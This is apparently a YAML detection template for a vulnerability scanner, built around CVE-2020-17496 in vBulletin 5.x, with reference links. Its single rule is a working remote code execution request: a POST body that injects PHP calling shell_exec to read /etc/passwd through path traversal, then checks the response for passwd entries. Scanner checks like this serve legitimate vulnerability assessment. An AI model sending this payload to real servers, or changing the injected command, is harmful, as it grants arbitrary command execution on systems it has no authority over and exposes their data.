name: yaml-poc-vbulletin-vbulletin-other-CVE-2020-17496
binding: 8bec5305-3f4f-4002-b8cd-d1e41341f9c8
detail:
    author: jiapeng.han
    links:
        - https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/
        - https://cwe.mitre.org/data/definitions/78.html
        - https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch
        - https://nvd.nist.gov/vuln/detail/CVE-2020-17496
        - https://seclists.org/fulldisclosure/2020/Aug/5
    vulnerability:
        id: 3fc9a7bd-54ea-4a94-805d-05d9cae4b35c
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ajax/render/widget_tabbedcontainer_tab_panel
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec('cat ../../../../../../../../../../../../etc/passwd'); exit;"
            follow_redirects: false
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: r0()
